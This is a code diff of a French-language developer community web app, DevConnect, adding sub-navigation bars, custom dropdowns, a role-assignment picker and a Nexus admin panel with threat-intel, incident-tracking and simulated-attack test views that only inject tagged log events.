+      <div class="module-subnav">
+        <span class="module-subnav-back" onclick="navigate('home')">← Modules</span>
+        <span class="module-subnav-title">Teams</span>
+        <div class="module-subnav-tabs">
+          <span class="module-subnav-tab" data-target="feed" onclick="navigate('feed')">Fil d'actualité</span>
+          <span class="module-subnav-tab" data-target="messages" onclick="navigate('messages')">Messages</span>
+          <span class="module-subnav-tab" data-target="discover" onclick="navigate('discover')">Découverte</span>
+        </div>
+      </div>
       <div class="messages-layout">
         <div class="channels-sidebar">
           <div class="channels-header">Messages</div>
@@ -1880,6 +2182,15 @@ a{color:inherit;}::selection{background:#333;color:#fff;}
 
     <!-- DÉCOUVERTE -->
     <div class="app-section" id="section-discover">
+      <div class="module-subnav">
+        <span class="module-subnav-back" onclick="navigate('home')">← Modules</span>
+        <span class="module-subnav-title">Teams</span>
+        <div class="module-subnav-tabs">
+          <span class="module-subnav-tab" data-target="feed" onclick="navigate('feed')">Fil d'actualité</span>
+          <span class="module-subnav-tab" data-target="messages" onclick="navigate('messages')">Messages</span>
+          <span class="module-subnav-tab" data-target="discover" onclick="navigate('discover')">Découverte</span>
+        </div>
+      </div>
       <div class="discover-layout">
         <div>
           <div class="discover-search-bar"><span style="color:var(--text-muted);font-size:18px">⌕</span><input class="discover-search-input" placeholder="Rechercher un dev, une compétence, un profil..." oninput="filterDevs(this.value)"></div>
@@ -1911,6 +2222,10 @@ a{color:inherit;}::selection{background:#333;color:#fff;}
 
     <!-- APPRENDRE -->
     <div class="app-section" id="section-learn">
+      <div class="module-subnav">
+        <span class="module-subnav-back" onclick="navigate('home')">← Modules</span>
+        <span class="module-subnav-title">Docs</span>
+      </div>
       <div class="learn-layout">
         <div class="learn-sidebar">
           <div class="widget-title" style="margin-bottom:12px">Catégories</div>
@@ -1945,6 +2260,10 @@ a{color:inherit;}::selection{background:#333;color:#fff;}
 
     <!-- CLASSEMENT -->
     <div class="app-section" id="section-ranking">
+      <div class="module-subnav">
+        <span class="module-subnav-back" onclick="navigate('home')">← Modules</span>
+        <span class="module-subnav-title">Insight</span>
+      </div>
       <div class="ranking-layout">
         <div class="ranking-header">
           <div class="feed-title">Classement</div>
@@ -1963,6 +2282,10 @@ a{color:inherit;}::selection{background:#333;color:#fff;}
 
     <!-- RECRUTEMENT -->
     <div class="app-section" id="section-recruit">
+      <div class="module-subnav">
+        <span class="module-subnav-back" onclick="navigate('home')">← Modules</span>
+        <span class="module-subnav-title">Deploy</span>
+      </div>
       <div class="recruit-layout">
         <div>
           <div class="recruit-hero">
@@ -2000,6 +2323,14 @@ a{color:inherit;}::selection{background:#333;color:#fff;}
 
     <!-- SNIPPETS -->
     <div class="app-section" id="section-snippets">
+      <div class="module-subnav">
+        <span class="module-subnav-back" onclick="navigate('home')">← Modules</span>
+        <span class="module-subnav-title">Code</span>
+        <div class="module-subnav-tabs">
+          <span class="module-subnav-tab" data-target="editor" onclick="navigate('editor')">Éditeur</span>
+          <span class="module-subnav-tab" data-target="snippets" onclick="navigate('snippets')">Snippets</span>
+        </div>
+      </div>
       <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:20px">
         <div>
           <div class="feed-title">Bibliothèque de Snippets</div>
@@ -2021,6 +2352,14 @@ a{color:inherit;}::selection{background:#333;color:#fff;}
 
     <!-- ÉDITEUR -->
     <div class="app-section" id="section-editor">
+      <div class="module-subnav">
+        <span class="module-subnav-back" onclick="navigate('home')">← Modules</span>
+        <span class="module-subnav-title">Code</span>
+        <div class="module-subnav-tabs">
+          <span class="module-subnav-tab" data-target="editor" onclick="navigate('editor')">Éditeur</span>
+          <span class="module-subnav-tab" data-target="snippets" onclick="navigate('snippets')">Snippets</span>
+        </div>
+      </div>
       <div class="editor-layout">
         <div class="editor-sidebar">
           <div class="editor-sidebar-header" style="display:flex;align-items:center;justify-content:space-between">
@@ -2462,7 +2801,11 @@ a{color:inherit;}::selection{background:#333;color:#fff;}
           <div class="nexus-sec-label">Automatisation</div>
           <div class="nexus-nav-item" onclick="switchNexus(this,'nexus-rules');loadNexusRules()"><span class="nexus-nav-icon">&#9670;</span>Regles<span class="nexus-nav-badge" id="nexus-rules-badge">0</span></div>
           <div class="nexus-nav-item" onclick="switchNexus(this,'nexus-alerts');loadNexusAlerts()"><span class="nexus-nav-icon">&#9671;</span>Alertes<span class="nexus-nav-badge alert" id="nexus-alerts-badge" style="display:none">!</span></div>
+          <div class="nexus-sec-label">Cyber Defense</div>
+          <div class="nexus-nav-item" onclick="switchNexus(this,'nexus-threats');loadNexusThreatIntel()"><span class="nexus-nav-icon">&#9888;</span>Threat Intel<span class="nexus-nav-badge alert" id="nexus-threats-badge" style="display:none">!</span></div>
+          <div class="nexus-nav-item" onclick="switchNexus(this,'nexus-incidents');loadNexusIncidents()"><span class="nexus-nav-icon">&#9760;</span>Incidents<span class="nexus-nav-badge" id="nexus-incidents-badge">0</span></div>
           <div class="nexus-sec-label">Systeme</div>
+          <div class="nexus-nav-item" onclick="switchNexus(this,'nexus-tests');initNexusTests()"><span class="nexus-nav-icon">&#9874;</span>Tests</div>
           <div class="nexus-nav-item" onclick="switchNexus(this,'nexus-settings')"><span class="nexus-nav-icon">&#11041;</span>Parametres</div>
         </div>
 
@@ -2543,22 +2886,42 @@ a{color:inherit;}::selection{background:#333;color:#fff;}
               <div class="nexus-card-head"><div class="nexus-card-title">&#11041; Creer une regle</div></div>
               <div style="padding:18px 20px">
                 <div style="display:grid;grid-template-columns:1fr 1fr 1fr auto;gap:12px;align-items:flex-end">
-                  <div><label class="form-label">Si evenement</label><select class="form-input" id="nrule-trigger" style="font-family:var(--font-mono);font-size:12px">
-                    <option value="xp_exploit_blocked">Tentative de triche XP</option>
-                    <option value="xp_duplicate_attempt">Double soumission XP</option>
-                    <option value="unsafe_url_blocked">URL dangereuse bloquee</option>
-                    <option value="login_failed">Echec de connexion</option>
-                    <option value="ban">Bannissement</option>
-                    <option value="mute">Mute</option>
-                    <option value="spam_detected">Spam detecte</option>
-                    <option value="register">Nouvelle inscription</option>
-                  </select></div>
+                  <div><label class="form-label">Si evenement</label><div class="cdrop mono" id="nrule-trigger-cdrop" data-id="nrule-trigger">
+                    <input type="hidden" id="nrule-trigger" value="xp_exploit_blocked">
+                    <div class="cdrop-trigger" tabindex="0" onclick="toggleCustomDropdown('nrule-trigger')" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();toggleCustomDropdown('nrule-trigger')}">
+                      <span class="cdrop-trigger-label" id="nrule-trigger-label">Tentative de triche XP</span>
+                      <span class="cdrop-trigger-arrow"></span>
+                    </div>
+                    <div class="cdrop-menu">
+                      <div class="cdrop-option selected" data-value="xp_exploit_blocked" onclick="selectCustomDropdown('nrule-trigger','xp_exploit_blocked')">Tentative de triche XP</div>
+                      <div class="cdrop-option" data-value="xp_duplicate_attempt" onclick="selectCustomDropdown('nrule-trigger','xp_duplicate_attempt')">Double soumission XP</div>
+                      <div class="cdrop-option" data-value="unsafe_url_blocked" onclick="selectCustomDropdown('nrule-trigger','unsafe_url_blocked')">URL dangereuse bloquee</div>
+                      <div class="cdrop-option" data-value="login_failed" onclick="selectCustomDropdown('nrule-trigger','login_failed')">Echec de connexion</div>
+                      <div class="cdrop-option" data-value="ban" onclick="selectCustomDropdown('nrule-trigger','ban')">Bannissement</div>
+                      <div class="cdrop-option" data-value="mute" onclick="selectCustomDropdown('nrule-trigger','mute')">Mute</div>
+                      <div class="cdrop-option" data-value="spam_detected" onclick="selectCustomDropdown('nrule-trigger','spam_detected')">Spam detecte</div>
+                      <div class="cdrop-option" data-value="register" onclick="selectCustomDropdown('nrule-trigger','register')">Nouvelle inscription</div>
+                      <div class="cdrop-option" data-value="brute_force_detected" onclick="selectCustomDropdown('nrule-trigger','brute_force_detected')">Brute Force détecté</div>
+                      <div class="cdrop-option" data-value="privilege_escalation_attempt" onclick="selectCustomDropdown('nrule-trigger','privilege_escalation_attempt')">Escalade de privilèges</div>
+                      <div class="cdrop-option" data-value="account_takeover_attempt" onclick="selectCustomDropdown('nrule-trigger','account_takeover_attempt')">Prise de contrôle de compte</div>
+                      <div class="cdrop-option" data-value="data_scraping_detected" onclick="selectCustomDropdown('nrule-trigger','data_scraping_detected')">Scraping de données</div>
+                      <div class="cdrop-option" data-value="content_injection_attempt" onclick="selectCustomDropdown('nrule-trigger','content_injection_attempt')">Injection de contenu</div>
+                    </div>
+                  </div></div>
                   <div><label class="form-label">Seuil (occurrences/24h)</label><input type="number" class="form-input form-input-mono" id="nrule-threshold" value="3" min="1" max="99" style="font-size:12px"></div>
-                  <div><label class="form-label">Action automatique</label><select class="form-input" id="nrule-action" style="font-family:var(--font-mono);font-size:12px">
-                    <option value="alert_admin">Alerter l'admin</option>
-                    <option value="flag">Flagguer seulement</option>
-                    <option value="warn">Avertissement (log)</option>
-                  </select></div>
+                  <div><label class="form-label">Action automatique</label><div class="cdrop mono" id="nrule-action-cdrop" data-id="nrule-action">
+                    <input type="hidden" id="nrule-action" value="alert_admin">
+                    <div class="cdrop-trigger" tabindex="0" onclick="toggleCustomDropdown('nrule-action')" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();toggleCustomDropdown('nrule-action')}">
+                      <span class="cdrop-trigger-label" id="nrule-action-label">Alerter l'admin</span>
+                      <span class="cdrop-trigger-arrow"></span>
+                    </div>
+                    <div class="cdrop-menu">
+                      <div class="cdrop-option selected" data-value="alert_admin" onclick="selectCustomDropdown('nrule-action','alert_admin')">Alerter l'admin</div>
+                      <div class="cdrop-option" data-value="flag" onclick="selectCustomDropdown('nrule-action','flag')">Flagguer seulement</div>
+                      <div class="cdrop-option" data-value="warn" onclick="selectCustomDropdown('nrule-action','warn')">Avertissement (log)</div>
+                      <div class="cdrop-option" data-value="create_incident" onclick="selectCustomDropdown('nrule-action','create_incident')">Créer incident auto</div>
+                    </div>
+                  </div></div>
                   <button class="btn btn-primary" onclick="createNexusRule()" style="font-size:12px;white-space:nowrap">Creer regle</button>
                 </div>
                 <div style="font-size:11px;color:rgba(255,255,255,.25);font-family:var(--font-mono);margin-top:10px">Astuce : laisse le panel Nexus ouvert dans un onglet pour que les regles s'executent en temps reel sur les nouveaux events.</div>
@@ -2575,6 +2938,101 @@ a{color:inherit;}::selection{background:#333;color:#fff;}
             </div>
           </div>
 
+          <!-- ===== THREAT INTEL ===== -->
+          <div class="nexus-section" id="nexus-threats">
+            <div class="nexus-page-title">&#9888; Threat Intelligence <span class="nexus-live-pulse live-dot" style="margin-left:6px"></span></div>
+            <div class="nexus-page-sub">Analyse des menaces actives &middot; scoring de risque utilisateur &middot; détection brute-force</div>
+            <div class="nexus-threat-grid">
+              <div class="nexus-threat-card danger">
+                <div class="nexus-threat-title">&#9650; Brute Force — Tentatives login groupées</div>
+                <div id="nexus-bf-list"><div style="text-align:center;padding:20px;color:rgba(255,255,255,.2);font-size:11px;font-family:var(--font-mono)">Analyse en cours...</div></div>
+              </div>
+              <div class="nexus-threat-card warn">
+                <div class="nexus-threat-title">&#9651; Anomalies comportementales</div>
+                <div id="nexus-anomaly-list"><div style="text-align:center;padding:20px;color:rgba(255,255,255,.2);font-size:11px;font-family:var(--font-mono)">Analyse en cours...</div></div>
+              </div>
+            </div>
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;">
+              <div class="nexus-card">
+                <div class="nexus-card-head"><div class="nexus-card-title">&#9679; Risk Score — Top utilisateurs suspects</div><button class="btn btn-ghost btn-sm" onclick="loadNexusThreatIntel()" style="font-size:11px">&#8635;</button></div>
+                <div id="nexus-risk-list" style="padding:8px 18px"><div style="text-align:center;padding:20px;color:rgba(255,255,255,.2);font-size:11px;font-family:var(--font-mono)">Calcul du scoring...</div></div>
+              </div>
+              <div class="nexus-card">
+                <div class="nexus-card-head"><div class="nexus-card-title">&#9661; Live Attack Feed</div><button class="btn btn-ghost btn-sm" onclick="loadNexusThreatIntel()" style="font-size:11px">&#8635;</button></div>
+                <div class="nexus-attack-feed" id="nexus-attack-feed"><div style="text-align:center;padding:20px;color:rgba(255,255,255,.2);font-size:11px;font-family:var(--font-mono)">Aucune attaque détectée</div></div>
+              </div>
+            </div>
+          </div>
+
+          <!-- ===== INCIDENTS ===== -->
+          <div class="nexus-section" id="nexus-incidents">
+            <div class="nexus-page-title">&#9760; Gestion des Incidents</div>
+            <div class="nexus-page-sub">Suivi des incidents de sécurité ouverts · workflow investigation → résolution</div>
+            <div style="display:flex;gap:8px;margin-bottom:16px;align-items:center">
+              <button class="filter-chip active" onclick="nexusFilterIncidents(this,'all')">Tous</button>
+              <button class="filter-chip" onclick="nexusFilterIncidents(this,'open')">Ouverts</button>
+              <button class="filter-chip" onclick="nexusFilterIncidents(this,'investigating')">En cours</button>
+              <button class="filter-chip" onclick="nexusFilterIncidents(this,'resolved')">Résolus</button>
+              <button class="btn btn-primary btn-sm" style="margin-left:auto;font-size:12px" onclick="openCreateIncidentModal()">+ Créer incident</button>
+            </div>
+            <div id="nexus-incidents-list"><div style="text-align:center;padding:40px;color:rgba(255,255,255,.2);font-size:12px;font-family:var(--font-mono)">Chargement des incidents...</div></div>
+            <!-- Modal create incident -->
+            <div id="nexus-incident-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:200;align-items:center;justify-content:center">
+              <div style="background:var(--bg1);border:1px solid rgba(255,255,255,.1);border-radius:var(--radius-lg);padding:28px;width:480px;max-width:95vw">
+                <div style="font-family:var(--font-display);font-size:16px;font-weight:700;margin-bottom:18px">Créer un incident</div>
+                <div style="margin-bottom:12px"><label class="form-label">Titre</label><input class="form-input" id="inc-title" placeholder="Ex: Brute force sur /login" style="font-size:13px"></div>
+                <div style="margin-bottom:12px"><label class="form-label">Description</label><textarea class="form-input" id="inc-desc" rows="3" placeholder="Détails de l'incident..." style="font-size:13px;resize:vertical"></textarea></div>
+                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:18px">
+                  <div><label class="form-label">Sévérité</label>
+                    <select class="form-input" id="inc-severity" style="font-size:13px">
+                      <option value="critical">Critical</option>
+                      <option value="high">High</option>
+                      <option value="medium" selected>Medium</option>
+                      <option value="low">Low</option>
+                    </select>
+                  </div>
+                  <div><label class="form-label">Catégorie</label>
+                    <select class="form-input" id="inc-category" style="font-size:13px">
+                      <option value="brute_force">Brute Force</option>
+                      <option value="xp_exploit">Exploit XP</option>
+                      <option value="spam">Spam / Flood</option>
+                      <option value="suspicious_account">Compte suspect</option>
+                      <option value="data_abuse">Abus de données</option>
+                      <option value="other">Autre</option>
+                    </select>
+                  </div>
+                </div>
+                <div style="display:flex;gap:10px;justify-content:flex-end">
+                  <button class="btn btn-ghost" onclick="closeIncidentModal()">Annuler</button>
+                  <button class="btn btn-primary" onclick="createIncident()">Créer</button>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- ===== TESTS ===== -->
+          <div class="nexus-section" id="nexus-tests">
+            <div class="nexus-page-title">&#9874; Simulateur d'attaques</div>
+            <div class="nexus-page-sub">Injecte des événements de test dans Nexus pour valider le système de détection</div>
+            <div class="nexus-card" style="margin-bottom:16px">
+              <div class="nexus-card-head"><div class="nexus-card-title">Scénarios de test</div><span style="font-family:var(--font-mono);font-size:10px;color:rgba(255,255,255,.25)">Ces events apparaîtront dans les logs avec le tag [TEST]</span></div>
+              <div class="nexus-test-grid" id="nexus-test-grid">
+                <button class="nexus-test-btn" onclick="runNexusTest('brute_force')"><span class="nexus-test-label">🔨 Brute Force</span><span class="nexus-test-desc">Simule 8 tentatives login échouées</span></button>
+                <button class="nexus-test-btn" onclick="runNexusTest('xp_farming')"><span class="nexus-test-label">⚡ XP Farming</span><span class="nexus-test-desc">Simule 5 tentatives de triche XP</span></button>
+                <button class="nexus-test-btn" onclick="runNexusTest('spam_flood')"><span class="nexus-test-label">📨 Spam Flood</span><span class="nexus-test-desc">Simule 6 détections de spam</span></button>
+                <button class="nexus-test-btn" onclick="runNexusTest('url_injection')"><span class="nexus-test-label">🔗 URL Injection</span><span class="nexus-test-desc">Simule 3 tentatives d'URL dangereuses</span></button>
+                <button class="nexus-test-btn" onclick="runNexusTest('privilege_escalation')"><span class="nexus-test-label">👑 Privilege Escalation</span><span class="nexus-test-desc">Simule une tentative d'escalade de rôle</span></button>
+                <button class="nexus-test-btn" onclick="runNexusTest('account_takeover')"><span class="nexus-test-label">🎭 Account Takeover</span><span class="nexus-test-desc">Simule pattern de prise de contrôle</span></button>
+                <button class="nexus-test-btn" onclick="runNexusTest('data_scraping')"><span class="nexus-test-label">🕷 Data Scraping</span><span class="nexus-test-desc">Simule accès massif aux profils</span></button>
+                <button class="nexus-test-btn" onclick="runNexusTest('full_attack')"><span class="nexus-test-label" style="color:#e08080">💥 Scénario Complet</span><span class="nexus-test-desc">Tous les tests en séquence (15s)</span></button>
+              </div>
+            </div>
+            <div class="nexus-card">
+              <div class="nexus-card-head"><div class="nexus-card-title">Console de test</div><button class="btn btn-ghost btn-sm" onclick="clearTestLog()" style="font-size:11px">Effacer</button></div>
+              <div id="nexus-test-console" class="nexus-test-log" style="margin:12px 18px 16px"><span class="info">» Prêt. Lance un scénario pour commencer.</span></div>
+            </div>
+          </div>
+
           <div class="nexus-section" id="nexus-settings">
             <div class="nexus-page-title">&#11041; Parametres Nexus</div>
             <div class="nexus-page-sub">Configuration du moteur d'automatisation</div>
@@ -2588,9 +3046,9 @@ a{color:inherit;}::selection{background:#333;color:#fff;}
               </div>
             </div>
             <div style="margin-top:16px;padding:14px 18px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.05);border-radius:var(--radius);font-family:var(--font-mono);font-size:11px;color:rgba(255,255,255,.25);line-height:1.8">
-              Nexus v1.0 &middot; by DevConnect<br>
-              Source de donnees : table nexus_logs (Supabase, projet DevConnect)<br>
-              Regles &amp; alertes : stockees localement sur cet appareil pour l'instant.
+              Nexus v2.0 &middot; by DevConnect<br>
+              Modules : Dashboard · Logs · Règles · Alertes · Threat Intel · Incidents · Tests<br>
+              Source : nexus_logs &amp; nexus_incidents (Supabase)
             </div>
           </div>
         </div>
@@ -2858,7 +3316,18 @@ a{color:inherit;}::selection{background:#333;color:#fff;}
               <div class="admin-form-title">✦ Attribuer le premium</div>
               <div class="admin-form-grid" style="margin-bottom:14px">
                 <div class="form-group" style="margin:0"><label class="form-label">Pseudo</label><input type="text" class="form-input form-input-mono" id="premium-username" placeholder="pseudo_utilisateur"></div>
-                <div class="form-group" style="margin:0"><label class="form-label">Niveau</label><select class="form-input" id="premium-tier-select"><option value="dev-plus">Dev+</option><option value="devconnect-plus">DevConnect+</option><option value="none">Retirer</option></select></div>
+                <div class="form-group" style="margin:0"><label class="form-label">Niveau</label><div class="cdrop" id="premium-tier-select-cdrop" data-id="premium-tier-select">
+                  <input type="hidden" id="premium-tier-select" value="dev-plus">
+                  <div class="cdrop-trigger" tabindex="0" onclick="toggleCustomDropdown('premium-tier-select')" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();toggleCustomDropdown('premium-tier-select')}">
+                    <span class="cdrop-trigger-label" id="premium-tier-select-label">Dev+</span>
+                    <span class="cdrop-trigger-arrow"></span>
+                  </div>
+                  <div class="cdrop-menu">
+                    <div class="cdrop-option selected" data-value="dev-plus" onclick="selectCustomDropdown('premium-tier-select','dev-plus')">Dev+</div>
+                    <div class="cdrop-option" data-value="devconnect-plus" onclick="selectCustomDropdown('premium-tier-select','devconnect-plus')">DevConnect+</div>
+                    <div class="cdrop-option" data-value="none" onclick="selectCustomDropdown('premium-tier-select','none')">Retirer</div>
+                  </div>
+                </div></div>
               </div>
               <button class="btn btn-primary btn-sm" onclick="grantPremium()">Appliquer</button>
             </div>
@@ -2868,50 +3337,81 @@ a{color:inherit;}::selection{background:#333;color:#fff;}
           <div class="admin-section" id="admin-roles-a">
             <div class="admin-page-header">
               <div class="admin-page-title">Rôles & Certifications</div>
-              <div class="admin-page-sub">Gérer les rôles et certifications des membres</div>
+              <div class="admin-page-sub">Attribuer des rôles et certifications aux membres</div>
             </div>
+
+            <!-- ASSIGN ROLE -->
+            <div class="admin-form-card" style="margin-bottom:16px">
+              <div class="admin-form-title">⬡ Attribuer un rôle</div>
+              <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;align-items:start">
+                <div>
+                  <div class="form-group" style="margin-bottom:14px">
+                    <label class="form-label">Pseudo cible</label>
+                    <input type="text" class="form-input form-input-mono" id="role-username" placeholder="pseudo_utilisateur" oninput="previewRoleTarget(this.value)">
+                  </div>
+                  <div style="background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:var(--radius);padding:12px 14px;min-height:52px;display:flex;align-items:center;gap:10px" id="role-target-preview">
+                    <span style="font-size:12px;color:var(--text-muted);font-family:var(--font-mono)">← Entre un pseudo pour prévisualiser</span>
+                  </div>
+                  <div style="margin-top:14px;display:flex;gap:8px">
+                    <button class="btn btn-primary btn-sm" onclick="assignRole()" style="flex:1;justify-content:center">⬡ Attribuer le rôle</button>
+                    <button class="btn btn-ghost btn-sm" onclick="resetRolePicker()" title="Réinitialiser">↺</button>
+                  </div>
+                  <div id="role-assign-feedback" style="margin-top:8px;font-size:12px;font-family:var(--font-mono)"></div>
+                </div>
+                <div>
+                  <div class="form-label" style="margin-bottom:10px">Sélectionner un rôle</div>
+                  <div id="role-picker-area">
+                    <div style="font-size:10px;font-family:var(--font-mono);text-transform:uppercase;letter-spacing:.1em;color:rgba(255,255,255,.25);margin-bottom:6px">Leadership</div>
+                    <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px">
+                      <div class="role-pill" data-role="architect" onclick="selectRolePill(this)" style="--rpill-c:#c8a86a">⬡ Architect</div>
+                      <div class="role-pill" data-role="admin" onclick="selectRolePill(this)" style="--rpill-c:#a08cd8">◈ Admin</div>
+                      <div class="role-pill" data-role="responsable_modo" onclick="selectRolePill(this)" style="--rpill-c:#8ab8d8">◉ Resp. Modération</div>
+                      <div class="role-pill" data-role="moderator_senior" onclick="selectRolePill(this)" style="--rpill-c:#78a0c0">◉ Modo Senior</div>
+                      <div class="role-pill" data-role="moderator" onclick="selectRolePill(this)" style="--rpill-c:#6890a8">◉ Modérateur</div>
+                      <div class="role-pill" data-role="moderator_junior" onclick="selectRolePill(this)" style="--rpill-c:#587890">◉ Modo Junior</div>
+                    </div>
+                    <div style="font-size:10px;font-family:var(--font-mono);text-transform:uppercase;letter-spacing:.1em;color:rgba(255,255,255,.25);margin-bottom:6px">Équipe</div>
+                    <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px">
+                      <div class="role-pill" data-role="community_manager" onclick="selectRolePill(this)" style="--rpill-c:#78c88a">◈ Community</div>
+                      <div class="role-pill" data-role="content_manager" onclick="selectRolePill(this)" style="--rpill-c:#68b87a">◈ Contenu</div>
+                      <div class="role-pill" data-role="staff" onclick="selectRolePill(this)" style="--rpill-c:#888888">◆ Staff</div>
+                    </div>
+                    <div style="font-size:10px;font-family:var(--font-mono);text-transform:uppercase;letter-spacing:.1em;color:rgba(255,255,255,.25);margin-bottom:6px">Membres certifiés</div>
+                    <div style="display:flex;flex-wrap:wrap;gap:6px">
+                      <div class="role-pill" data-role="certified_dev" onclick="selectRolePill(this)" style="--rpill-c:#d8c878">◇ Dev Certifié</div>
+                      <div class="role-pill" data-role="mentor" onclick="selectRolePill(this)" style="--rpill-c:#c8d8a8">◇ Mentor</div>
+                    </div>
+                  </div>
+                  <!-- Hidden input to hold selected value -->
+                  <input type="hidden" id="role-select" value="">
+                  <div id="role-selected-label" style="margin-top:10px;font-size:11px;font-family:var(--font-mono);color:var(--text-muted)">Aucun rôle sélectionné</div>
+                </div>
+              </div>
+            </div>
+
+            <!-- CERTIFICATION -->
             <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
               <div class="admin-form-card">
-                <div class="admin-form-title">⬡ Attribuer un rôle</div>
-                <div class="form-group"><label class="form-label">Pseudo</label><input type="text" class="form-input form-input-mono" id="role-username" placeholder="pseudo_utilisateur"></div>
-                <div class="form-group"><label class="form-label">Rôle</label>
-                  <select class="form-input" id="role-select">
-                    <optgroup label="— Leadership">
-                      <option value="architect">⬡ Architect</option>
-                      <option value="admin">◈ Admin</option>
-                      <option value="moderator">◉ Modérateur</option>
-                    </optgroup>
-                    <optgroup label="— Équipe">
-                      <option value="core_dev">◆ Core Dev</option>
-                      <option value="designer_team">◇ Designer UI/UX</option>
-                      <option value="security_team">⬢ Security</option>
-                      <option value="devops_team">⬟ DevOps</option>
-                      <option value="community_manager">◈ Community Manager</option>
-                    </optgroup>
-                    <optgroup label="— Membres">
-                      <option value="web_dev">Dev Web</option>
-                      <option value="mobile_dev">Dev Mobile</option>
-                      <option value="backend_dev">Dev Backend</option>
-                      <option value="fullstack_dev">Fullstack</option>
-                      <option value="cybersecurity">Cybersécurité</option>
-                      <option value="devops">DevOps</option>
-                      <option value="data">Data</option>
-                      <option value="ai_ml">IA / ML</option>
-                      <option value="designer_ux">Designer UX</option>
-                      <option value="recruiter">Recruteur tech</option>
-                    </optgroup>
-                  </select>
+                <div class="admin-form-title">✦ Badge certifié</div>
+                <div style="display:flex;align-items:center;gap:10px;padding:10px 12px;background:rgba(200,200,216,.05);border:1px solid rgba(200,200,216,.1);border-radius:var(--radius);margin-bottom:14px">
+                  <div style="width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#c8c8d8,#a0a0b8);display:flex;align-items:center;justify-content:center;font-size:13px;flex-shrink:0">✦</div>
+                  <div>
+                    <div style="font-size:12px;font-weight:600">DevConnect Certified</div>
+                    <div style="font-size:11px;color:var(--text-muted);line-height:1.4">Badge visible sur le profil et dans le chat. Accordé manuellement par un Architect.</div>
+                  </div>
                 </div>
-                <button class="btn btn-primary btn-sm" onclick="assignRole()">Attribuer</button>
-              </div>
-              <div class="admin-form-card">
-                <div class="admin-form-title">✦ Certification</div>
-                <div style="font-size:13px;color:var(--text-muted);margin-bottom:14px;line-height:1.6">Badge certifié visible sur le profil et dans le chat. Accordé manuellement.</div>
                 <div class="form-group"><label class="form-label">Pseudo</label><input type="text" class="form-input form-input-mono" id="certif-username" placeholder="pseudo_utilisateur"></div>
                 <div style="display:flex;gap:8px">
-                  <button class="btn btn-primary btn-sm" onclick="toggleCertif(true)">✦ Certifier</button>
-                  <button class="btn btn-ghost btn-sm" onclick="toggleCertif(false)">Retirer</button>
+                  <button class="btn btn-primary btn-sm" onclick="toggleCertif(true)" style="flex:1;justify-content:center">✦ Certifier</button>
+                  <button class="btn btn-ghost btn-sm" onclick="toggleCertif(false)" style="flex:1;justify-content:center">Retirer</button>
                 </div>
+              </div>
+              <div class="admin-form-card" style="background:rgba(200,168,106,.04);border-color:rgba(200,168,106,.12)">
+                <div class="admin-form-title" style="color:#c8a86a">⬡ Rôle actuel d'un membre</div>
+                <div style="font-size:13px;color:var(--text-muted);margin-bottom:14px;line-height:1.6">Consulte le rôle actuel d'un membre avant toute modification.</div>
+                <div class="form-group"><label class="form-label">Pseudo</label><input type="text" class="form-input form-input-mono" id="check-role-username" placeholder="pseudo_utilisateur"></div>
+                <button class="btn btn-ghost btn-sm" onclick="checkMemberRole()" style="width:100%;justify-content:center">◈ Vérifier le rôle</button>
+                <div id="check-role-result" style="margin-top:12px;font-size:12px;font-family:var(--font-mono);color:var(--text-secondary);min-height:20px"></div>
               </div>
             </div>
           </div>
@@ -3807,13 +4307,15 @@ function navigate(section) {
   }
   document.querySelectorAll('.app-section').forEach(s => s.classList.remove('active'));
   document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  document.querySelectorAll('.module-subnav-tab').forEach(t => t.classList.toggle('active', t.dataset.target === section));
   document.getElementById('section-' + section)?.classList.add('active');
   document.querySelector(`[data-section="${section}"]`)?.classList.add('active');
   currentSection = section;
   if (section === 'admin') loadAdminData();
   if (section === 'messages') { loadMessages(); loadDmList(); }
   if (section === 'profile') updateProfileSection();
-  if (section === 'home') { loadFeed(); loadSidebarLeaderboard(); loadActiveAnnouncementBanner(); }
+  if (section === 'feed') { loadFeed(); loadSidebarLeaderboard(); loadActiveAnnouncementBanner(); }
+  if (section === 'home') { loadActiveAnnouncementBanner(); }
   if (section === 'ranking') loadRanking();
   if (section === 'discover') loadDiscover();
   if (section === 'recruit') loadJobs();
@@ -5691,12 +6193,60 @@ async function adminDeleteMsg(id){
   loadContentMod();
 }
 
+// ── ROLE PICKER helpers ──
+function selectRolePill(el){
+  document.querySelectorAll('#role-picker-area .role-pill').forEach(p=>p.classList.remove('selected'));
+  el.classList.add('selected');
+  const role=el.dataset.role;
+  document.getElementById('role-select').value=role;
+  const label=document.getElementById('role-selected-label');
+  if(label)label.textContent='Rôle sélectionné : '+el.textContent.trim();
+}
+function resetRolePicker(){
+  document.querySelectorAll('#role-picker-area .role-pill').forEach(p=>p.classList.remove('selected'));
+  document.getElementById('role-select').value='';
+  const label=document.getElementById('role-selected-label');
+  if(label)label.textContent='Aucun rôle sélectionné';
+  const fb=document.getElementById('role-assign-feedback');
+  if(fb)fb.textContent='';
+}
+let _previewDebounce=null;
+function previewRoleTarget(val){
+  clearTimeout(_previewDebounce);
+  const prev=document.getElementById('role-target-preview');
+  if(!prev)return;
+  if(!val.trim()){prev.innerHTML='<span style="font-size:12px;color:var(--text-muted);font-family:var(--font-mono)">← Entre un pseudo pour prévisualiser</span>';return;}
+  _previewDebounce=setTimeout(async()=>{
+    const{data}=await db.from('profiles').select('username,avatar_url,role,is_certified').eq('username',val.trim()).maybeSingle();
+    if(!data){prev.innerHTML='<span style="font-size:12px;color:rgba(200,80,80,.8);font-family:var(--font-mono)">Utilisateur introuvable</span>';return;}
+    const init=(data.username||'?').substring(0,2).toUpperCase();
